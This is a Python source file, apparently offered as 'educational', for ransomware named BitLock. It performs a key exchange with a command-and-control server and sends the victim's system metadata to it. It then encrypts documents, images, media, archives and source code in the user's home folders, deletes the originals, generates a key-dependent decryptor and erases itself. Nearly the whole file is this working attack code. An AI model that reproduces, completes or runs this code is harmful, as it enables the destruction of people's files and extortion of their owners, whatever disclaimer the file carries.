#!/usr/bin/env python3
#Bitlocked AES-256-GCM

#(Educational Purposes Only)
#License: MIT

import os
import sys
import socket
import platform
import secrets
import json
import ctypes
import threading
import time
import hashlib
import shutil
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import ec, padding
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

# ============= CONFIGURACIÓN =============
HOST = '127.0.0.1'
PORT = 5000
MAX_WORKERS = min(32, (os.cpu_count() or 1) * 4)

# ============= PROTECCIÓN DEL SISTEMA =============
# Directorios críticos que NUNCA deben cifrarse (multiplataforma)
SYSTEM_DIRS_BLACKLIST = {
    # Windows
    'Windows', 'System32', 'SysWOW64', 'Program Files', 'Program Files (x86)',
    'ProgramData', 'Windows.old', '$Recycle.Bin', 'Recovery', 'Boot',

    # Linux/Unix
    'bin', 'sbin', 'boot', 'dev', 'proc', 'sys', 'run', 'lib', 'lib64',
    'etc', 'root', 'var/log', 'var/run', 'tmp', 'usr/bin', 'usr/sbin',

    # macOS
    'System', 'Library', 'Applications', 'Volumes', 'cores', 'private',

    # Comunes
    '.git', '.svn', 'node_modules', '__pycache__', '.cache'
}

# Extensiones críticas del sistema que NO se cifran
SYSTEM_FILES_BLACKLIST = {
    # Ejecutables del sistema
    '.exe', '.dll', '.sys', '.drv', '.ocx',

    # Configuración crítica
    '.ini', '.cfg', '.conf',

    # Ya cifrados
    '.locked', '.encrypted', '.enc',

    # El propio ransomware
    '.py', '.pyc', '.pyo'
}

# Extensiones objetivo (todo lo demás)
TARGET_EXTENSIONS = {
    # Documentos
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.odt', '.ods', '.odp',
    '.txt', '.rtf', '.tex', '.wpd', '.wps',

    # Imágenes
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg', '.psd', '.ai', '.raw', '.cr2',
    '.tif', '.tiff', '.ico', '.webp',

    # Videos
    '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm', '.m4v', '.mpg', '.mpeg',

    # Audio
    '.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a', '.opus',

    # Archivos
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz',

    # Código fuente (proyectos)
    '.c', '.cpp', '.h', '.java', '.cs', '.js', '.ts', '.go', '.rs', '.rb',
    '.php', '.html', '.css', '.scss', '.sql', '.sh', '.bash',

    # Bases de datos
    '.db', '.sqlite', '.mdb', '.accdb', '.sql', '.dbf',

    # Otros
    '.json', '.xml', '.csv', '.log', '.md', '.bak'
}

# ============= CLASE PRINCIPAL =============
class BitLockRansomware:

    def __init__(self):
        self.c2_addr = (HOST, PORT)
        self.aes_key = None
        self.aesgcm = None
        self.journal = []
        self.journal_lock = threading.Lock()
        self.stats = {
            'total_files': 0,
            'encrypted': 0,
            'failed': 0,
            'skipped': 0,
            'bytes_encrypted': 0
        }
        self.victim_id = self._generate_victim_id()
        self.platform_info = self._gather_system_info()

    def _generate_victim_id(self):
        """Genera ID único para la víctima"""
        hostname = platform.node()
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        random_suffix = secrets.token_hex(4)
        return f"{hostname}_{timestamp}_{random_suffix}"

    def _gather_system_info(self):
        """Recopila información del sistema"""
        return {
            'hostname': platform.node(),
            'os': platform.system(),
            'os_version': platform.version(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'python_version': platform.python_version(),
            'victim_id': self.victim_id
        }

    def _print(self, msg, level='info'):
        """Print con timestamp"""
        colors = {
            'info': '\033[36m',
            'success': '\033[32m',
            'warning': '\033[33m',
            'error': '\033[31m',
            'bold': '\033[1m'
        }
        reset = '\033[0m'
        timestamp = time.strftime('%H:%M:%S')
        color = colors.get(level, '')
        print(f"{color}[{timestamp}] {msg}{reset}")

    def _ecdhe_handshake(self):
        """
        Handshake ECDHE con el servidor C2
        Retorna la clave AES derivada o None si falla
        """
        try:
            self._print("Initiating ECDHE handshake with C2...", 'info')

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect(self.c2_addr)

            # 1. Solicitar handshake
            sock.send(b"HANDSHAKE")

            # 2. Recibir respuesta del servidor
            response = sock.recv(8192)

            if not response.startswith(b"MODE:ECDHE"):
                self._print("Server doesn't support ECDHE", 'warning')
                sock.close()
                return None

            # 3. Extraer clave pública del servidor
            server_pub_bytes = b'\n'.join(response.split(b'\n')[1:])
            server_ecdh_public = serialization.load_pem_public_key(server_pub_bytes)

            self._print("Server ECDH public key received", 'success')

            # 4. Generar nuestro par ECDH efímero
            client_ecdh_private = ec.generate_private_key(ec.SECP384R1())
            client_ecdh_public = client_ecdh_private.public_key()

            # 5. Serializar nuestra clave pública
            client_pub_bytes = client_ecdh_public.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )

            # 6. Enviar clave pública + metadata al servidor
            metadata_json = json.dumps(self.platform_info).encode('utf-8')
            payload = client_pub_bytes + b'\n---METADATA---\n' + metadata_json
            sock.send(payload)

            self._print("Client ECDH public key sent", 'success')

            # 7. Realizar ECDH: calcular shared secret
            shared_secret = client_ecdh_private.exchange(ec.ECDH(), server_ecdh_public)

            # 8. Derivar clave AES con HKDF
            aes_key = HKDF(
                algorithm=hashes.SHA256(),
                length=32,  # AES-256
                salt=None,
                info=b'BitLock-c2-session'
            ).derive(shared_secret)

            # 9. Esperar confirmación del servidor
            confirmation = sock.recv(1024)

            if b"OK:ECDHE" not in confirmation:
                self._print("ECDHE handshake failed", 'error')
                sock.close()
                return None

            self._print(f"ECDHE completed successfully (PFS enabled)", 'success')

            # 10. CRÍTICO: Destruir claves efímeras
            del client_ecdh_private
            del shared_secret

            sock.close()
            return aes_key

        except Exception as e:
            self._print(f"ECDHE failed: {e}", 'error')
            return None

    def _rsa_fallback(self):
        """
        Fallback a RSA si ECDHE falla
        Retorna la clave AES o None si falla
        """
        try:
            self._print("Attempting RSA fallback...", 'warning')

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect(self.c2_addr)

            # 1. Solicitar handshake
            sock.send(b"HANDSHAKE")

            # 2. Recibir clave pública RSA
            response = sock.recv(8192)

            if not response.startswith(b"MODE:RSA"):
                self._print("Server doesn't support RSA", 'error')
                sock.close()
                return None

            # 3. Extraer clave pública RSA
            rsa_pub_bytes = b'\n'.join(response.split(b'\n')[1:])
            rsa_public = serialization.load_pem_public_key(rsa_pub_bytes)

            self._print("Server RSA public key received", 'success')

            # 4. Generar clave AES aleatoria
            aes_key = AESGCM.generate_key(bit_length=256)

            # 5. Cifrar clave AES con RSA
            encrypted_aes_key = rsa_public.encrypt(
                aes_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )

            # 6. Enviar clave cifrada + metadata
            metadata_json = json.dumps(self.platform_info).encode('utf-8')
            payload = encrypted_aes_key + b'\n---METADATA---\n' + metadata_json
            sock.send(payload)

            self._print("Encrypted AES key sent via RSA", 'success')

            # 7. Esperar confirmación
            confirmation = sock.recv(1024)

            if b"OK:RSA" not in confirmation:
                self._print("RSA handshake failed", 'error')
                sock.close()
                return None

            self._print("RSA fallback completed (WARNING: No PFS)", 'warning')

            sock.close()
            return aes_key

        except Exception as e:
            self._print(f"RSA fallback failed: {e}", 'error')
            return None

    def _establish_c2_connection(self):
        """
        Establece conexión con C2 (ECDHE primario, RSA fallback)
        Retorna True si exitoso, False si falla
        """
        self._print("="*70, 'bold')
        self._print("Establishing C2 connection...", 'bold')
        self._print("="*70, 'bold')

        # Intentar ECDHE primero
        self.aes_key = self._ecdhe_handshake()

        # Si ECDHE falla, intentar RSA
        if self.aes_key is None:
            self._print("ECDHE failed, falling back to RSA...", 'warning')
            self.aes_key = self._rsa_fallback()

        # Si ambos fallan
        if self.aes_key is None:
            self._print("CRITICAL: Both ECDHE and RSA failed!", 'error')
            return False

        # Inicializar cifrador AES-GCM
        self.aesgcm = AESGCM(self.aes_key)

        self._print("="*70, 'bold')
        self._print("C2 connection established successfully!", 'success')
        self._print(f"AES Key: {self.aes_key.hex()[:32]}...", 'info')
        self._print("="*70, 'bold')

        return True

    def _is_system_path(self, path):
        """Verifica si el path es del sistema y no debe cifrarse"""
        path_str = str(path).lower()

        # Verificar directorios del sistema
        for blocked_dir in SYSTEM_DIRS_BLACKLIST:
            if blocked_dir.lower() in path_str:
                return True

        return False

    def _should_encrypt(self, file_path):
        """Determina si un archivo debe cifrarse"""
        try:
            # Verificar si es path del sistema
            if self._is_system_path(file_path):
                return False

            # Verificar extensión
            ext = Path(file_path).suffix.lower()

            # Extensiones del sistema que no se cifran
            if ext in SYSTEM_FILES_BLACKLIST:
                return False

            # Solo cifrar extensiones objetivo
            if ext not in TARGET_EXTENSIONS:
                return False

            # Verificar tamaño (no cifrar archivos muy grandes > 1GB)
            if os.path.getsize(file_path) > 1_073_741_824:  # 1GB
                return False

            return True

        except Exception:
            return False

    def _encrypt_file(self, file_path):
        """Cifra un archivo individual"""
        try:
            # Verificar si debe cifrarse
            if not self._should_encrypt(file_path):
                self.stats['skipped'] += 1
                return False

            # Leer archivo
            with open(file_path, 'rb') as f:
                plaintext = f.read()

            # Generar nonce único
            nonce = secrets.token_bytes(12)

            # Cifrar con AES-GCM
            ciphertext = self.aesgcm.encrypt(nonce, plaintext, None)

            # Construir archivo cifrado (nonce + ciphertext)
            encrypted_data = nonce + ciphertext

            # Escribir archivo cifrado
            encrypted_path = str(file_path) + '.locked'
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)

            # Registrar en journal
            file_info = {
                'original': str(file_path),
                'encrypted': encrypted_path,
                'size': len(plaintext),
                'extension': Path(file_path).suffix
            }

            with self.journal_lock:
                self.journal.append(file_info)

            # Eliminar archivo original
            os.remove(file_path)

            # Actualizar estadísticas
            self.stats['encrypted'] += 1
            self.stats['bytes_encrypted'] += len(plaintext)

            return True

        except Exception as e:
            self.stats['failed'] += 1
            return False

    def _discover_files(self):
        """Descubre archivos a cifrar en el sistema"""
        self._print("Discovering files to encrypt...", 'info')

        targets = []

        # Determinar directorios raíz según plataforma
        system = platform.system()

        if system == 'Windows':
            # Windows: Documentos, Desktop, Downloads del usuario actual
            user_profile = os.environ.get('USERPROFILE', '')
            if user_profile:
                search_dirs = [
                    os.path.join(user_profile, 'Documents'),
                    os.path.join(user_profile, 'Desktop'),
                    os.path.join(user_profile, 'Downloads'),
                    os.path.join(user_profile, 'Pictures'),
                    os.path.join(user_profile, 'Videos'),
                    os.path.join(user_profile, 'Music')
                ]
        else:
            # Linux/macOS: Home del usuario
            home = os.path.expanduser('~')
            search_dirs = [
                os.path.join(home, 'Documents'),
                os.path.join(home, 'Desktop'),
                os.path.join(home, 'Downloads'),
                os.path.join(home, 'Pictures'),
                os.path.join(home, 'Videos'),
                os.path.join(home, 'Music')
            ]

        # Escanear directorios
        for search_dir in search_dirs:
            if not os.path.exists(search_dir):
                continue

            for root, dirs, files in os.walk(search_dir):
                # Filtrar directorios del sistema
                if self._is_system_path(root):
                    dirs[:] = []  # No descender
                    continue

                # Agregar archivos
                for file in files:
                    file_path = os.path.join(root, file)
                    if self._should_encrypt(file_path):
                        targets.append(file_path)

        self.stats['total_files'] = len(targets)
        self._print(f"Found {len(targets)} files to encrypt", 'success')

        return targets

    def _encrypt_all_files(self, targets):
        """Cifra todos los archivos usando multithreading"""
        self._print("="*70, 'bold')
        self._print("Starting encryption process...", 'bold')
        self._print("="*70, 'bold')

        start_time = time.time()

        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = {executor.submit(self._encrypt_file, target): target for target in targets}

            for future in as_completed(futures):
                pass  # Los resultados ya se registran en _encrypt_file

        elapsed = time.time() - start_time

        self._print("="*70, 'bold')
        self._print("Encryption completed!", 'success')
        self._print(f"Total files:     {self.stats['total_files']}", 'info')
        self._print(f"Encrypted:       {self.stats['encrypted']}", 'success')
        self._print(f"Failed:          {self.stats['failed']}", 'error')
        self._print(f"Skipped:         {self.stats['skipped']}", 'warning')
        self._print(f"Bytes encrypted: {self.stats['bytes_encrypted']:,}", 'info')
        self._print(f"Time elapsed:    {elapsed:.2f}s", 'info')
        self._print("="*70, 'bold')

    def _save_encrypted_journal(self):
        """Guarda el journal cifrado"""
        try:
            # Serializar journal
            journal_json = json.dumps(self.journal, indent=2).encode('utf-8')

            # Cifrar journal
            nonce = secrets.token_bytes(12)
            encrypted_journal = self.aesgcm.encrypt(nonce, journal_json, None)

            # Guardar
            journal_file = 'RansomWare_recovery.dat'
            with open(journal_file, 'wb') as f:
                f.write(nonce + encrypted_journal)

            self._print(f"Encrypted journal saved: {journal_file}", 'success')
            return journal_file

        except Exception as e:
            self._print(f"Failed to save journal: {e}", 'error')
            return None

    def _generate_decryptor(self):
        """Genera script de descifrado (sin clave)"""
        decryptor_code = '''#!/usr/bin/env python3
"""
RansomWare BitLock Decryptor - File Recovery Tool
Generated automatically by RansomwareBitLock

INSTRUCTIONS:
1. Obtain the AES key from the server
2. Run: python3 BitLock_decryptor.py <AES_KEY_HEX>
3. Files will be restored to their original locations
"""

import os
import sys
import json
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def decrypt_file(encrypted_path, aes_key_hex, aesgcm):
    """Decrypt a single file"""
    try:
        # Read encrypted file
        with open(encrypted_path, 'rb') as f:
            data = f.read()

        # Extract nonce and ciphertext
        nonce = data[:12]
        ciphertext = data[12:]

        # Decrypt
        plaintext = aesgcm.decrypt(nonce, ciphertext, None)

        # Get original path (remove .locked extension)
        original_path = encrypted_path.rsplit('.locked', 1)[0]

        # Write decrypted file
        with open(original_path, 'wb') as f:
            f.write(plaintext)

        # Remove encrypted file
        os.remove(encrypted_path)

        return True
    except Exception as e:
        print(f"[-] Failed to decrypt {encrypted_path}: {e}")
        return False

def decrypt_all(aes_key_hex, journal_file='RansomWare_recovery.dat'):
    """Decrypt all files using the journal"""

    print("="*70)
    print("BitLock Decryptor - Starting recovery process...")
    print("="*70)

    # Convert hex key to bytes
    try:
        aes_key = bytes.fromhex(aes_key_hex)
        aesgcm = AESGCM(aes_key)
        print("[+] AES key loaded successfully")
    except Exception as e:
        print(f"[-] Invalid AES key: {e}")
        return

    # Load and decrypt journal
    if not os.path.exists(journal_file):
        print(f"[-] Journal file not found: {journal_file}")
        print("[*] Attempting to decrypt all .locked files...")

        # Fallback: buscar todos los archivos .locked
        for root, dirs, files in os.walk('.'):
            for file in files:
                if file.endswith('.locked'):
                    encrypted_path = os.path.join(root, file)
                    if decrypt_file(encrypted_path, aes_key_hex, aesgcm):
                        print(f"[+] Decrypted: {encrypted_path}")
        return

    try:
        with open(journal_file, 'rb') as f:
            journal_data = f.read()

        nonce = journal_data[:12]
        encrypted_journal = journal_data[12:]

        journal_json = aesgcm.decrypt(nonce, encrypted_journal, None)
        journal = json.loads(journal_json.decode('utf-8'))

        print(f"[+] Journal loaded: {len(journal)} files")
    except Exception as e:
        print(f"[-] Failed to load journal: {e}")
        return

    # Decrypt all files
    success_count = 0
    fail_count = 0

    for entry in journal:
        encrypted_path = entry.get('encrypted')

        if not encrypted_path or not os.path.exists(encrypted_path):
            fail_count += 1
            continue

        if decrypt_file(encrypted_path, aes_key_hex, aesgcm):
            success_count += 1
            print(f"[+] Restored: {entry.get('original')}")
        else:
            fail_count += 1

    print("="*70)
    print("Recovery completed!")
    print(f"[+] Successfully decrypted: {success_count}")
    print(f"[-] Failed: {fail_count}")
    print("="*70)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 BitLock_decryptor.py <AES_KEY_HEX>")
        print("Example: python3 BitLock_decryptor.py a1b2c3d4e5f6...")
        sys.exit(1)

    aes_key_hex = sys.argv[1]
    decrypt_all(aes_key_hex)
'''

        try:
            decryptor_file = 'BitLock_decryptor.py'
            with open(decryptor_file, 'w') as f:
                f.write(decryptor_code)

            # Hacer ejecutable en Unix
            if platform.system() != 'Windows':
                os.chmod(decryptor_file, 0o755)

            self._print(f"Decryptor script generated: {decryptor_file}", 'success')
            return decryptor_file

        except Exception as e:
            self._print(f"Failed to generate decryptor: {e}", 'error')
            return None

    def _secure_wipe_key(self):
        """Borra la clave AES de la memoria de forma segura"""
        try:
            if self.aes_key:
                # Sobrescribir con ceros
                if isinstance(self.aes_key, bytes):
                    key_array = bytearray(self.aes_key)
                    for i in range(len(key_array)):
                        key_array[i] = 0

                # Eliminar referencias
                del self.aes_key
                del self.aesgcm

                self._print("AES key securely wiped from memory", 'success')
        except Exception as e:
            self._print(f"Failed to wipe key: {e}", 'warning')

    def _self_destruct(self):
        """Auto-destrucción del ransomware"""
        try:
            self._print("Initiating self-destruct sequence...", 'warning')

            # Obtener path del script actual
            script_path = os.path.abspath(__file__)

            # Crear script de auto-eliminación
            if platform.system() == 'Windows':
                delete_script = f'''
@echo off
timeout /t 2 /nobreak > nul
del "{script_path}"
del "%~f0"
'''
                delete_file = 'delete_me.bat'
            else:
                delete_script = f'''#!/bin/bash
sleep 2
rm -f "{script_path}"
rm -f "$0"
'''
                delete_file = 'delete_me.sh'

            with open(delete_file, 'w') as f:
                f.write(delete_script)

            if platform.system() != 'Windows':
                os.chmod(delete_file, 0o755)

            # Ejecutar script de auto-eliminación
            if platform.system() == 'Windows':
                os.system(f'start /min cmd /c {delete_file}')
            else:
                os.system(f'./{delete_file} &')

            self._print("Self-destruct initiated", 'warning')

        except Exception as e:
            self._print(f"Self-destruct failed: {e}", 'error')

    def run(self):
        """Ejecuta el ransomware completo"""
        try:
            print("\n")
            self._print("="*70, 'bold')
            self._print("   Ransomware", 'bold')
            self._print("="*70, 'bold')
            self._print(f"Victim ID: {self.victim_id}", 'info')
            self._print(f"Platform:  {self.platform_info['os']} {self.platform_info['architecture']}", 'info')
            self._print("="*70, 'bold')
            print("\n")

            # 1. Establecer conexión con C2 y transmitir clave ANTES de cifrar
            if not self._establish_c2_connection():
                self._print("CRITICAL: Cannot proceed without C2 connection", 'error')
                return

            print("\n")

            # 2. Descubrir archivos
            targets = self._discover_files()

            if not targets:
                self._print("No files found to encrypt", 'warning')
                return

            print("\n")

            # 3. Cifrar todos los archivos
            self._encrypt_all_files(targets)

            print("\n")

            # 4. Guardar journal cifrado
            self._save_encrypted_journal()

            # 5. Generar script descifrador
            self._generate_decryptor()

            print("\n")

            # 6. Limpiar rastros
            self._print("Cleaning up...", 'info')
            self._secure_wipe_key()

            print("\n")

            # 7. Auto-destrucción
            self._self_destruct()

            print("\n")
            self._print("="*70, 'bold')
            self._print("Operation completed successfully!", 'success')
            self._print("="*70, 'bold')

        except KeyboardInterrupt:
            print("\n")
            self._print("Operation interrupted by user", 'error')
        except Exception as e:
            self._print(f"Critical error: {e}", 'error')
            import traceback
            traceback.print_exc()

# ============= MAIN =============
if __name__ == "__main__":
    ransomware = BitLockRansomware()
